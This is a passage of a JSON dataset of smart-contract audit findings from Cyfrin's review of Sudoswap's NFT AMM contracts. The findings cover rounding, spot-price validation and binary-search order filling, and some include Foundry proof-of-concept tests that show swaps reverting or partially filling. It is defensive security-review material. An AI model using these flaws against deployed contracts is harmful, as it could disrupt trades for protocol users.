      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Sudoswap",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-06-01-Sudoswap.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Hans",
        "Alex Roan",
        "0kage",
        "Giovanni Di Siena"
      ]
    },
    {
      "id": "18425",
      "title": "`LSSVMPair` does not inherit `ILSSVMPair`",
      "impact": "LOW",
      "content": "The interface `ILSSVMPair` is defined and used in several places, but the abstract `LSSVMPair` does not inherit from it.\nConsider adding `is ILSSVMPair` to the `LSSVMPair` contract declaration.\n\n**Sudoswap:**\nAcknowledged.\n\n**Cyfrin:**\nAcknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Sudoswap",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-06-01-Sudoswap.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Hans",
        "Alex Roan",
        "0kage",
        "Giovanni Di Siena"
      ]
    },
    {
      "id": "18424",
      "title": "Event parameter names are incorrect",
      "impact": "LOW",
      "content": "The first parameter in each of these `LSSVMPair` events is named incorrectly:\n\n```solidity\nevent SwapNFTInPair(uint256 amountIn, uint256[] ids);\nevent SwapNFTInPair(uint256 amountIn, uint256 numNFTs);\nevent SwapNFTOutPair(uint256 amountOut, uint256[] ids);\nevent SwapNFTOutPair(uint256 amountOut, uint256 numNFTs);\n```\n\nThey should instead look like this:\n\n```solidity\nevent SwapNFTInPair(uint256 amountOut, uint256[] ids);\nevent SwapNFTInPair(uint256 amountOut, uint256 numNFTs);\nevent SwapNFTOutPair(uint256 amountIn, uint256[] ids);\nevent SwapNFTOutPair(uint256 amountIn, uint256 numNFTs);\n```\n\n**Sudoswap:**\nFixed in commit [29449e](https://github.com/sudoswap/lssvm2/commit/29449e45fd7ebaf1b932c135df65b08e998d1071).\n\n**Cyfrin:**\nVerified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Sudoswap",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-06-01-Sudoswap.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Hans",
        "Alex Roan",
        "0kage",
        "Giovanni Di Siena"
      ]
    },
    {
      "id": "18423",
      "title": "`vm.prank()` before nested function call in tests does not work as intended",
      "impact": "LOW",
      "content": "Foundry's prank cheat code applies to the next external call only. [Nested](https://github.com/sudoswap/lssvm2/blob/78d38753b2042d7813132f26e5573c6699b605ef/src/test/base/VeryFastRouterAllSwapTypes.sol#L1090-L1092) [calls](https://github.com/sudoswap/lssvm2/blob/0967f16fb0f32b0b76f37c09e6acf35ac007225f/src/test/base/VeryFastRouterWithRoyalties.sol#L1108-L1110) are evaluated right-to-left, and so the prank is not applied as intended. Either cache necessary function calls as local variables or use `vm.startPrank(addr)` and `vm.stopPrank()`. Extending tests to assert for expected event emissions is recommended and should help to catch cases like this.\n\n**Sudoswap:**\nAcknowledged.\n\n**Cyfrin:**\nAcknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Sudoswap",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-06-01-Sudoswap.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Hans",
        "Alex Roan",
        "0kage",
        "Giovanni Di Siena"
      ]
    },
    {
      "id": "18422",
      "title": "Unreachable code path in `RoyaltyEngine::_getRoyaltyAndSpec`",
      "impact": "LOW",
      "content": "Within `RoyaltyEngine`, `int16` values have been copied over from the manifold contract for use as enum values relating to different royalty specifications with `int16 private constant NONE = -1;` and `int16 private constant NOT_CONFIGURED = 0;`. The [if case](https://github.com/sudoswap/lssvm2/blob/0967f16fb0f32b0b76f37c09e6acf35ac007225f/src/RoyaltyEngine.sol#L152) in `RoyaltyEngine::_getRoyaltyAndSpec` catches `spec <= NOT_CONFIGURED` so the following [code](https://github.com/sudoswap/lssvm2/blob/0967f16fb0f32b0b76f37c09e6acf35ac007225f/src/RoyaltyEngine.sol#L237-L238) in the else block is not reachable and can be removed.\n```solidity\nif (spec == NONE) {\n    return (recipients, amounts, spec, royaltyAddress, addToCache);\n}\n```\n\n**Sudoswap:**\nFixed in commit [9bf4be](https://github.com/sudoswap/lssvm2/commit/9bf4be10366b0339dbae08d77bbf7ff81d4f51ff).\n\n**Cyfrin:**\nAcknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Sudoswap",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-06-01-Sudoswap.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Hans",
        "Alex Roan",
        "0kage",
        "Giovanni Di Siena"
      ]
    },
    {
      "id": "18421",
      "title": "Incorrect/incomplete NatSpec & comments",
      "impact": "LOW",
      "content": "The NatSpec for `LSSVMPair::getAssetRecipient` currently [reads](https://github.com/sudoswap/lssvm2/blob/0967f16fb0f32b0b76f37c09e6acf35ac007225f/src/LSSVMPair.sol#L319) \"Returns the address that assets that receives assets when a swap is done with this pair\" but it should be \"Returns the address that receives assets when a swap is done with this pair\". Additionally, in several instances, NatSpec could be more detailed to better explain parameters and return values, e.g. [`LSSVMPair::getSellNFTQuote`](https://github.com/sudoswap/lssvm2/blob/0967f16fb0f32b0b76f37c09e6acf35ac007225f/src/LSSVMPair.sol#L245-L249).\n\n`GDACurve::getSellInfo` has a [comment](https://github.com/sudoswap/lssvm2/blob/0967f16fb0f32b0b76f37c09e6acf35ac007225f/src/bonding-curves/GDACurve.sol#L180) which currently reads \"The expected output at for an auction at index n...\" but should be \"The expected output for an auction at index n...\".\n\n`LSSVMPairCloner::cloneERC1155ETHPair` has a [comment](https://github.com/sudoswap/lssvm2/blob/0967f16fb0f32b0b76f37c09e6acf35ac007225f/src/lib/LSSVMPairCloner.sol#L299) \"RUNTIME (53 bytes of code + 61 bytes of extra data = 114 bytes)\" but this should be 93 bytes of extra data, so 146 bytes total which corresponds to 0x92 runtime size above. The same is true of `LSSVMPairCloner::cloneERC1155ERC20Pair`, which has the [comment](https://github.com/sudoswap/lssvm2/blob/0967f16fb0f32b0b76f37c09e6acf35ac007225f/src/lib/LSSVMPairCloner.sol#L386) \"RUNTIME (53 bytes of code + 81 bytes of extra data = 134 bytes)\" but this should be 113 bytes of extra data, so 166 bytes total which corresponds to 0xa6 runtime size above.\n\nThe [comment](https://github.com/sudoswap/lssvm2/blob/0967f16fb0f32b0b76f37c09e6acf35ac007225f/src/VeryFastRouter.sol#L604) \"this is the max cost we are willing to pay, zero-indexed\" in `VeryFastRouter::_findMaxFillableAmtForSell` should be “this is the minimum output we are expecting from the sale, zero-indexed”.\n\n**Sudoswap:**\nFixed in commits [cb98b6](https://github.com/sudoswap/lssvm2/commit/cb98b66513a5dd149fcf169caafe6be370f5295b) and [9bf4be](https://github.com/sudoswap/lssvm2/commit/9bf4be10366b0339dbae08d77bbf7ff81d4f51ff).\n\n**Cyfrin:**\nVerified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Sudoswap",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-06-01-Sudoswap.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Hans",
        "Alex Roan",
        "0kage",
        "Giovanni Di Siena"
      ]
    },
    {
      "id": "18420",
      "title": "Make `LSSVMPair::call` payable to allow value to be sent with external calls",
      "impact": "LOW",
      "content": "**Description:**\nCurrently, [`LSSVMPair::call`](https://github.com/sudoswap/lssvm2/blob/78d38753b2042d7813132f26e5573c6699b605ef/src/LSSVMPair.sol#L640) simply passes a [value of zero](https://github.com/sudoswap/lssvm2/blob/78d38753b2042d7813132f26e5573c6699b605ef/src/LSSVMPair.sol#L661); however, there may be instances in which non-zero `msg.value` is required/desired and so the function should be marked as payable to allow the owner to supply ETH for the external call.\n\n**Impact:**\nIf the owner wishes to send ETH with the external call, they cannot do so, which may impact the external call's functionality.\n\n**Recommended Mitigation:**\nConsider allowing value to be passed to external calls by making `LSSVMPair::call` payable.\n\n**Sudoswap:**\nAcknowledged.\n\n**Cyfrin:**\nAcknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Sudoswap",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-06-01-Sudoswap.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Hans",
        "Alex Roan",
        "0kage",
        "Giovanni Di Siena"
      ]
    },
    {
      "id": "18419",
      "title": "Partially fillable order could revert",
      "impact": "LOW",
      "content": "**Description:**\nIn the sell logic of `VeryFastRouter::swap`, the protocol does not check the fillable amount and executes the swap if [`pairSpotPrice == order.expectedSpotPrice`](https://github.com/sudoswap/lssvm2/blob/0967f16fb0f32b0b76f37c09e6acf35ac007225f/src/VeryFastRouter.sol#L281). But this will revert if the pair has insufficient balance. On the other hand, if these criteria are not met, the protocol rechecks the max fillable amount, and a balance check is used in the binary search.\n\n**Impact:**\nPartially fillable orders would revert unnecessarily.\nWhile this does not affect funds, users would experience a revert for valid transactions.\n\n**Recommended Mitigation:**\nConsider handling cases where the pair has insufficient balance to prevent reverting for partially fillable orders.\n\n**Sudoswap:**\nAcknowledged, as long as the bonding curve increases in price (i.e. price to buy the Xth item costs more than the price to buy the Xth-1 item) and the partial fill order is created in reverse order, then this issue is avoided.\n\n**Cyfrin:**\nAcknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Sudoswap",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-06-01-Sudoswap.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Hans",
        "Alex Roan",
        "0kage",
        "Giovanni Di Siena"
      ]
    },
    {
      "id": "18418",
      "title": "Owner calling `LSSVMPair::changeSpotPrice` can cause arithmetic over/underflows on later swaps",
      "impact": "LOW",
      "content": "**Description:**\nChanging the spot price to a value higher than the current ERC20 (or ETH) balance of the pair can cause unintended reverts in valid swap calls later on.\n\n**Proof of Concept:**\n\nFull proof of concept [here](https://github.com/sudoswap/lssvm2/pull/1/files#diff-ccfdcc468a169eaf116e657d2cd2406530c2a693627167e375d78dcf8a73d87d). Snippet:\n\n```solidity\n‌// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport {InvariantERC721LinearERC20} from \"./InvariantERC721LinearERC20.t.sol\";\nimport {IERC721Mintable} from \"../interfaces/IERC721Mintable.sol\";\n\ncontract SwapArithmeticOverflow is InvariantERC721LinearERC20 {\n    function setUp() public override {\n        InvariantERC721LinearERC20.setUp();\n    }\n\n    function test_OverflowFail() public {\n        s_pair.changeSpotPrice(20989589403855433688750111262);\n\n        address payable msgSender = payable(0x0000000000000000000000000000000000004f89);\n        changePrank(msgSender);\n\n        uint256 newNFTId = 333;\n        IERC721Mintable(address(s_test721)).mint(msgSender, newNFTId);\n        (,,, uint256 minOutputAmount,,) = s_pair.getSellNFTQuote(newNFTId, 1);\n        s_test721.approve(address(s_pair), newNFTId);\n        uint256[] memory nftIds = new uint256[](1);\n        nftIds[0] = newNFTId;\n\n        vm.expectRevert(\"TRANSFER_FAILED\");\n        uint256 outputAmount = s_pair.swapNFTsForToken(nftIds, minOutputAmount, msgSender, false, address(0));\n    }\n}\n```\n\n**Impact:**\n`ILSSVMPair::swapNFTsForToken` reverts with a `TRANSFER_FAILED` error message despite the user obtaining a quote using `ILSSVMPair::getSellNFTQuote` in a prior call.\n\n**Recommended Mitigation:**\n`ILSSVMPair::getSellNFTQuote` should return a legitimate error code if the expected output exceeds the pair's balance.\nThis mitigates the impact on the end user trying to perform the swap. It will return a helpful error in the view function prior to the swap attempt rather than passing there, then failing on the actual attempt with an arithmetic error.\n\n**Sudoswap:**\nAcknowledged, the risk is acceptable as it leads to reverts, but cannot affect users funds.\nIn the case of owners adjusting price prior to a swap, the intent is for users to use the minOutput/maxInput amounts to protect themselves from excessive slippage.\n\n**Cyfrin:**\nAcknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Sudoswap",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-06-01-Sudoswap.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Hans",
        "Alex Roan",
        "0kage",
        "Giovanni Di Siena"
      ]
    },
    {
      "id": "18417",
      "title": "Binary search implementation may not always find the optimal solution",
      "impact": "MEDIUM",
      "content": "**Description:**\n`VeryFastRouter::_findMaxFillableAmtForBuy` and `VeryFastRouter::_findMaxFillableAmtForSell` utilize binary search to determine the maximum trade amount. The binary search seeks a solution in a linear, sorted space based on a test function (a criteria function used to decide the next search area). However, the current implementation is unlikely to guarantee this and might either fail to find a solution or identify a suboptimal one.\n\nFirst, `VeryFastRouter::_findMaxFillableAmtForSell` attempts to find a solution in an array `[1, …, minOutputPerNumNFTs.length]` and the test boolean function used is\n`error != CurveErrorCodes.Error.OK || currentOutput < minOutputPerNumNFTs[(start + end) / 2 - 1] || currentOutput > pairTokenBalance`, where `currentOutput` is the number of tokens that the user will receive for the trade of `(start+end)/2-1` items.\nIf we represent the test criteria as `f(x)`, where `x` is the number of items to trade, and treat `true` as `1` and `false` as `0`, then `f([1, …, minOutputPerNumNFTs.length])` should be like `[1, 1, .... 1, 0, ..., 0]` and the binary search should locate the final `1`.\nTo achieve this, each condition in the test function should produce outputs like `[1, 1, .... 1, 0, ..., 0]`; otherwise, the binary search may fail to find a solution or a suboptimal one.\nHowever, `GDACurve` does not satisfy the condition `error != CurveErrorCodes.Error.OK`. As `x` (`numItems`) increases, `alphaPowN` increases, and `newSpotPrice_` decreases. Therefore, it will return `ERROR.SPOT_PRICE_OVERFLOW` for `x` less than a specific threshold and `ERROR.OK` for `x` greater than or equal to the threshold. As a result, the output of this condition will be like `[0, 0, .... 0, 1, ..., 1]` and not `[1, 1, .... 1, 0, ..., 0]`.\n\nNext, in `VeryFastRouter::_findMaxFillableAmtForBuy`, the core criteria function for binary search is that the cost of buying `i` NFT's (let's call it `C[i]`) should be less than or equal to the max bid price placed by a user for purchasing `i` NFTs (`(i-1)-`th element in the `maxCostPerNumNFTs` array, `maxCostPerNumNFTs[i-1]`). The implicit assumption here is that, if `C[i] > maxCostPerNumNFTs[i-1]`, then `C[j] > maxCostPerNumNFTs[j-1]` for all `j > i`.\nThis implies that if the cost of purchasing `i` NFTs from the pool surpasses the maximum bid a user has placed for acquiring `i` NFTs, the purchase cost should persistently exceed the maximum bid even when attempting to buy a larger number of NFTs. This condition may not always hold true. For instance, if a user is solely interested in purchasing a larger collection of NFTs from a pool, they might place lower bids for buying a smaller quantity of items and more aggressive bids for acquiring a greater number of items in the pool.\n\n**Proof of Concept:**\nConsider a situation with the following conditions:\n\n1. A pool containing a collection of 11 NFTs with an Exponential Bonding Curve (Spot Price: 1 eth, Delta: 1.05).\n2. Alice computes the maximum bids for buying a collection of NFTs using `VeryFastRouter::getNFTQuoteForBuyOrderWithPartialFill`.\n3. Alice desires to acquire a majority of the NFTs in the pool but is not interested in purchasing if she only obtains a smaller portion of the NFTs. To achieve these goals, she adjusts her max bid array as follows.\n4. Alice reduces the max bid (calculated in step 2) for purchasing up to the first 50% of the total items in the pool by 25%.\n5. Alice increases the max bid (calculated in step 2) for purchasing more than 50% of the total items in the pool by 10%.\n\nDespite Alice's bid being sufficient to buy the entire collection, her order is only partially filled, and she receives a mere 5 NFTs out of the total 11.\n\nThe code snippet below replicates this scenario:\n```\n    function testSwapBinarySearch_audit() public{\n        //START_INDEX=0, END_INDEX=10\n        uint256[] memory nftIds;\n        LSSVMPair pair;\n        uint256 numNFTsForQuote = END_INDEX + 1;\n\n        //1. create an array of nft ids\n        nftIds = _getArray(START_INDEX, END_INDEX);\n        assertEq(nftIds.length, END_INDEX - START_INDEX + 1);\n\n        //2. setup a ERC721 ETH pair with property checker is zero address and zero deposit amount\n        pair = setUpPairERC721ForSale(0, address(0), nftIds);\n\n        //3. get the inputAmount needed to buy all NFTs in the pool\n        (,,,uint256 inputAmount,,) = pair.getBuyNFTQuote(0, numNFTsForQuote);\n\n        //4. get partialFillAmounts\n        uint256[] memory partialFillAmounts = router.getNFTQuoteForBuyOrderWithPartialFill(pair, numNFTsForQuote, 0, 0);\n\n        console.log(\"*********Max cost generated by getNFTQuoteForBuyOrderWithPartialFill**********\");\n        for(uint256 i; i< END_INDEX-START_INDEX + 1; i++){\n            console.log(\"Max Cost (default) to buy %i items, %i\", i+1, partialFillAmounts[i]);\n        }\n\n        // with no slippage, inputAmount should exactly be equal to the last partialFillAmount\n        assertEq(inputAmount, partialFillAmounts[END_INDEX-START_INDEX]);\n\n\n        uint256 midIndex = (END_INDEX - START_INDEX + 1 ) / 2;\n        console.log(\"**********Max cost custom created by a user**********\");\n         for(uint256 j; j< END_INDEX-START_INDEX + 1; j++){\n            if(j <= midIndex){\n                    partialFillAmounts[j] -= partialFillAmounts[j] * 25 / 100; //@audit reduce max bid by 25%\n            }\n            else{\n                   partialFillAmounts[j] += partialFillAmounts[j] * 10 / 100; //@audit increase max bid by 10%\n            }\n            console.log(\"Max Cost (custom) to buy %i items, %i\", j+1, partialFillAmounts[j]);\n        }\n        //6 creating a single buy order for the pair\n        VeryFastRouter.BuyOrderWithPartialFill memory buyOrder = VeryFastRouter.BuyOrderWithPartialFill({\n            pair: pair,\n            nftIds: nftIds,\n            maxInputAmount: inputAmount,\n            ethAmount: inputAmount,\n            expectedSpotPrice: pair.spotPrice() + 1, //getPairBaseQuoteTokenBalancetriggers partial fill logic\n            isERC721: true,\n            maxCostPerNumNFTs: partialFillAmounts\n        });\n\n        VeryFastRouter.BuyOrderWithPartialFill[] memory buyOrders =\n            new VeryFastRouter.BuyOrderWithPartialFill[](1); //adding a single buy order\n        VeryFastRouter.SellOrderWithPartialFill[] memory sellOrders; //no sell orders, just a 0 length array\n\n        buyOrders[0] = buyOrder;\n\n        //check that nft recipient before swap does not have any nfts\n        assertEq(IERC721(pair.nft()).balanceOf(NFT_RECIPIENT),0);\n\n        //-n check that pair holds all the nfts that are part of the buy order\n        assertEq(IERC721(pair.nft()).balanceOf(address(pair)), END_INDEX - START_INDEX + 1);\n\n        VeryFastRouter.Order memory swapOrder = VeryFastRouter.Order({\n            buyOrders: buyOrders,\n            sellOrders: sellOrders, //-n no sell orders for this case\n            tokenRecipient: payable(address(TOKEN_RECIPIENT)),\n            nftRecipient: NFT_RECIPIENT,\n            recycleETH: false\n        });\n\n        // Prank as the router caller and do the swap\n        vm.startPrank(ROUTER_CALLER);\n        address tokenAddress = getTokenAddress();\n\n        // Set up approval for token if it is a token pair (for router caller)\n        if (tokenAddress != address(0)) {\n            ERC20(tokenAddress).approve(address(router), 1e18 ether); //-n give approval for very high amount\n            IMintable(tokenAddress).mint(ROUTER_CALLER, 1e18 ether); //-n mint 1e18 ether\n        }\n\n        // // Store the swap results\n        uint256[] memory swapResults = router.swap{value: inputAmount}(swapOrder);\n        vm.stopPrank();\n\n        //-n should only have one order\n        assertEq(swapResults.length, buyOrders.length);\n\n        console.log(\"Total NFTs in the pair\", IERC721(pair.nft()).balanceOf(address(pair)));\n        console.log(\"Total NFTs received by nft recipient\", IERC721(pair.nft()).balanceOf(NFT_RECIPIENT));\n\n        assertEq(IERC721(pair.nft()).balanceOf(NFT_RECIPIENT), midIndex);\n\n    }\n```\n\nOutput:\n\n```solidity\n  *********Max cost generated by getNFTQuoteForBuyOrderWithPartialFill**********\n  Max Cost (default) to buy 1 items, 1710339358116313477\n  Max Cost (default) to buy 2 items, 3339233984893754885\n  Max Cost (default) to buy 3 items, 4890562200872270508\n  Max Cost (default) to buy 4 items, 6368017644661333008\n  Max Cost (default) to buy 5 items, 7775118067317583008\n  Max Cost (default) to buy 6 items, 9115213707942583008\n  Max Cost (default) to buy 7 items, 10391495270442583008\n  Max Cost (default) to buy 8 items, 11607001520442583008\n  Max Cost (default) to buy 9 items, 12764626520442583008\n  Max Cost (default) to buy 10 items, 13867126520442583003\n  Max Cost (default) to buy 11 items, 14917126520442583017\n  **********Max cost custom created by a user**********\n  Max Cost (custom) to buy 1 items, 1282754518587235108\n  Max Cost (custom) to buy 2 items, 2504425488670316164\n  Max Cost (custom) to buy 3 items, 3667921650654202881\n  Max Cost (custom) to buy 4 items, 4776013233495999756\n  Max Cost (custom) to buy 5 items, 5831338550488187256\n  Max Cost (custom) to buy 6 items, 6836410280956937256\n  Max Cost (custom) to buy 7 items, 11430644797486841308\n  Max Cost (custom) to buy 8 items, 12767701672486841308\n  Max Cost (custom) to buy 9 items, 14041089172486841308\n  Max Cost (custom) to buy 10 items, 15253839172486841303\n  Max Cost (custom) to buy 11 items, 16408839172486841318\n  Total NFTs in the pair 6\n  Total NFTs received by nft recipient 5\n```\n\nDespite the maximum bid for acquiring all 11 items being significantly higher than the true cost of the 11 items, the final outcome reveals that the user only obtains 5 items. Therefore, while users submit bids to purchase a larger quantity of NFTs, the existing implementation carries out a partial order and sells fewer NFTs to the user.\n\n**Impact:**\nThis issue does not result in an immediate financial loss. Nevertheless, users acquire fewer NFTs than they originally planned to buy. Given the significance of the core logic, the impact of this issue is considered to be MEDIUM.\n\n**Recommendation:**\nWhile we acknowledge that using a brute-force approach as an alternative to binary search could consume a significant amount of gas, we suggest conducting a comprehensive examination of possible edge cases (across all curve implementations) to guarantee that the binary search yields the best solution for any reasonable user inputs.\n\n**Sudoswap:**\nAcknowledged.\n\n**Cyfrin:**\nAcknowledged.",
      "summary": "\nThe bug report discusses an issue with the binary search algorithm used in the `VeryFastRouter::_findMaxFillableAmtForBuy` and `VeryFastRouter::_findMaxFillableAmtForSell` functions. The binary search seeks a solution in a linear, sorted space based on a test function. However, the current implementation is unlikely to guarantee this and might either fail to find a solution or identify a suboptimal one.\n\nIn the case of `VeryFastRouter::_findMaxFillableAmtForBuy`, the core criteria function for binary search is that the cost of buying `i` NFT's (let's call it `C[i]`) should be less than or equal to the max bid price placed by a user for purchasing `i` NFTs (`(i-1)-`th element in the `maxCostPerNumNFTs` array, `maxCostPerNumNFTs[i-1]`). The implicit assumption here is that, if `C[i] > maxCostPerNumNFTs[i-1]`, then `C[j] > maxCostPerNumNFTs[j-1]` for all `j > i`. This condition may not always hold true.\n\nTo demonstrate this, a proof of concept was provided. It showed that a user could adjust their max bid array, reducing the max bid for purchasing up to the first 50% of the total items in the pool by 25%, and increasing the max bid for purchasing more than 50% of the total items in the pool by 10%. Despite the bid being sufficient to buy the entire collection, the order was only partially filled, and the user received a mere 5 NFTs out of the total 11.\n\nThe impact of this issue is considered to be MEDIUM as it does not result in an immediate financial loss but users acquire fewer NFTs than they originally planned to buy. The recommendation is to conduct a comprehensive examination of possible edge cases (across all curve implementations) to guarantee that the binary search yields the best solution for any reasonable user inputs.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Sudoswap",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-06-01-Sudoswap.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Hans",
        "Alex Roan",
        "0kage",
        "Giovanni Di Siena"
      ]
    },
    {
      "id": "18416",
      "title": "GDACurve does not validate new spot price",
      "impact": "MEDIUM",
      "content": "**Description:**\nThe new spot price calculated in `GDACurve::getBuyInfo` and `GDACurve::getSellInfo` is not currently validated against `MIN_PRICE`, meaning that the price could fall below this value.\n\n```solidity\nGDACurve.sol (Line 81-91)\n\n        // The new spot price is multiplied by alpha^n and divided by the time decay so future\n        // calculations do not need to track number of items sold or the initial time/price. This new spot price\n        // implicitly stores the initial price, total items sold so far, and time elapsed since the start.\n        {\n            UD60x18 newSpotPrice_ = spotPrice_.mul(alphaPowN);\n            newSpotPrice_ = newSpotPrice_.div(decayFactor);\n            if (newSpotPrice_.gt(ud(type(uint128).max))) {\n                return (Error.SPOT_PRICE_OVERFLOW, 0, 0, 0, 0, 0);\n            } //@audit-info Missing minimum price check\n            newSpotPrice = uint128(unwrap(newSpotPrice_));\n        }\n```\n\nWhile a minimum price check is performed explicitly in `GDACurve::validateSpotPrice`, the same validation is missing when the price gets updated.\n\n```solidity\nGDACurve.sol (Line 34-36)\n\n    function validateSpotPrice(uint128 newSpotPrice) external pure override returns (bool) {\n        return newSpotPrice >= MIN_PRICE;\n    }\n```\n\nSince the maximum value of the decay factor is capped at a significantly large value (2^20), in scenarios with high `lambda`, low initial price, and low demand (i.e. extended time intervals between successive purchases), there is a likelihood that spot price can drop below `MIN_PRICE` level (currently set to a constant value, `1 gwei`).\n\n**Impact**\nIn most cases, dutch auctions tend to quickly find buyers long before prices hit the `MIN_PRICE` levels. Also, since the GDA bonding curve is only meant to be used for single-sided pools, there does not appear to be an immediate risk of pools trading large volumes at extremely low prices.\nHowever, not having a reserve price could mean market-making for some pools can happen at extremely low prices in perpetuity.\n\n**Recommended Mitigation:**\nAs with an exponential bonding curve, we recommend introducing minimum price validation in `GDACurve::getBuyInfo` and `GDACurve::getSellInfo` when the spot price is updated.\n\n**Sudoswap:**\nFixed in [commit c4dc61](https://github.com/sudoswap/lssvm2/commit/c4dc6159b8e3a3252f82ef4afea1f62417994425).\n\n**Cyfrin:**\nVerified.",
      "summary": "\nThis bug report is about the new spot price calculated in `GDACurve::getBuyInfo` and `GDACurve::getSellInfo` not being validated against `MIN_PRICE` (currently set to a constant value, `1 gwei`). This means that the spot price could fall below this value in certain scenarios with high `lambda`, low initial price, and low demand. \n\nThe impact of this bug is that market-making for some pools can happen at extremely low prices in perpetuity. To mitigate this, a minimum price validation should be introduced in `GDACurve::getBuyInfo` and `GDACurve::getSellInfo` when the spot price is updated. This was fixed in the commit c4dc61 and verified.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Sudoswap",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-06-01-Sudoswap.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Hans",
        "Alex Roan",
        "0kage",
        "Giovanni Di Siena"
      ]
    },
    {
      "id": "18415",
      "title": "Different rounding directions are recommended for getting buy/sell info",
      "impact": "MEDIUM",
      "content": "**Description:**\nThis issue pertains to the need for more implementation of different rounding directions for buy and sell operations in the AMM pools.\nIn several `ICurve` implementations (`XykCurve`, `GDACurve`), the `ICurve::getBuyInfo` and `ICurve::getSellInfo` functions are implemented using the same rounding direction.\nThis does not align with the best practices for AMM pools, which dictate that different rounding directions should be applied for buy and sell operations to prevent potential issues. The problem becomes more significant for tokens with fewer decimals, resulting in larger pricing discrepancies.\n\nNote that `ExponentialCurve` explicitly uses different rounding directions for buy and sell operations, which aligns with the best practices.\n\nAdditionally, across all curves, calculations of the protocol and trade fees currently do not round in favor of the protocol and fee recipients, which means that value may leak from the system in favor of the traders.\n\n**Impact:**\nThe issue may result in financial loss for pair creators and negatively impact the platform's overall stability, especially for tokens with fewer decimals. We, therefore, rate the severity as MEDIUM.\n\n**Recommended Mitigation:**\nEnsure that the buy price and protocol/trade fees are rounded up to prevent selling items at a lower price than desired and leaking value from the system.\n\n**Sudoswap:**\nFixed in [commit 902eee](https://github.com/sudoswap/lssvm2/commit/902eee37890af3953a55472d885bf6265b329434).\n\n**Cyfrin:**\nVerified.",
      "summary": "\nThis bug report is about the need for more implementation of different rounding directions for buy and sell operations in the AMM pools. In several `ICurve` implementations, the same rounding direction was applied for buy and sell operations, which does not align with the best practices for AMM pools. This may lead to financial loss for pair creators and negatively impact the platform's overall stability, especially for tokens with fewer decimals.\n\nThe recommended mitigation for this issue is to ensure that the buy price and protocol/trade fees are rounded up to prevent selling items at a lower price than desired and leaking value from the system. This issue has been fixed in the commit 902eee on the Sudoswap GitHub repository and has been verified by Cyfrin.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Sudoswap",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-06-01-Sudoswap.md",
      "github_link": "",
      "tags": [
        "Rounding"
      ],
      "finders": [
        "Hans",
        "Alex Roan",
        "0kage",
        "Giovanni Di Siena"
      ]
    },
    {
      "id": "18414",
      "title": "Possible reverts due to using stricter requirements in inner swap",
      "impact": "MEDIUM",
      "content": "**Description:**\n`VeryFastRouter::swap` relies on the internal functions `VeryFastRouter::_findMaxFillableAmtForSell` and `VeryFastRouter::_findMaxFillableAmtForBuy` to find the maximum possible amount of tokens to be swapped.\nThe output is supposed to be the _actual_ cost of the swap, and it is used as the [`minExpectedTokenOutput`](https://github.com/sudoswap/lssvm2/blob/78d38753b2042d7813132f26e5573c6699b605ef/src/erc721/LSSVMPairERC721.sol#L92) parameter for selling logic and the [`maxExpectedTokenInput`](https://github.com/sudoswap/lssvm2/blob/78d38753b2042d7813132f26e5573c6699b605ef/src/erc721/LSSVMPairERC721.sol#L32) parameter for buying logic; however, this is problematic and can lead to protocol unintended protocol behavior because the actual cost of the swap can differ from the output of these functions. We pointed out the issue with linearity assumptions in another finding, but we are raising this separately because the actual pair's swap function is being called with stricter requirements.\n\n```solidity\nVeryFastRouter.sol\n326:                 uint256 numItemsToFill;\n327:                 uint256 priceToFillAt;\n328:\n329:                 {\n330:                     